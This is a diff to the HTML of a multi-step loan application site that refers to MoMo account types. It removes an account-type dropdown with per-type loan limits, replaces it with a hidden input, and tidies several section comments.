@@ -10,7 +10,7 @@
 <body>
 
 <!-- ═══════════════════════════════════════════════════════════
-     PAGE 1: LANDING (calculator on the side)
+     PAGE 1: LANDING (calculator sidebar)
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-landing" class="page active">
     <div class="land-nav">
@@ -262,7 +262,7 @@
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     PAGE 5: STEP 1 — LOAN DETAILS (with account type selector)
+     PAGE 5: STEP 1 — LOAN DETAILS
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-step1" class="page">
     <nav class="navbar">
@@ -280,19 +280,7 @@
             <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
             <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
 
-            <!-- Account type selector (only for existing users) -->
-            <div class="field" id="accountTypeField">
-                <label>Your MoMo Account Type</label>
-                <div class="sel-wrap">
-                    <select id="s1at" onchange="selectExistingAccountType()">
-                        <option value="">Select your MoMo account type</option>
-                        <option value="yello">🟡 MoMo Yello — Max loan R20,000</option>
-                        <option value="yello_plus">⭐ MoMo Yello Plus — Max loan R40,000</option>
-                        <option value="eazi">⚡ MoMo Eazi — Max loan R10,000</option>
-                    </select>
-                </div>
-                <div class="field-hint">Pick the account type you have on MoMo</div>
-            </div>
+            <input type="hidden" id="s1at" value="" />
 
             <div class="acc-info-box" id="accInfoBox" style="display:none">
                 <div id="accInfoText"></div>
@@ -302,7 +290,7 @@
             <div class="field">
                 <label>Loan Amount (ZAR)</label>
                 <input type="number" id="s1am" value="50000" placeholder="Enter amount" min="5000" max="50000" oninput="clearErr('s1Err')" />
-                <div class="field-hint" id="loanLimitHint">Select your account type above first</div>
+                <div class="field-hint" id="loanLimitHint">Loading your limits...</div>
             </div>
             <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
             <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
@@ -371,9 +359,7 @@
     </div>
 </div>
 
-<!-- ═══════════════════════════════════════════════════════════
-     PAGE: STEP 4 — GUARANTOR
-     ═══════════════════════════════════════════════════════════ -->
+<!-- PAGE: STEP 4 — GUARANTOR -->
 <div id="page-guarantor" class="page">
     <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-step3')">← Back</a>
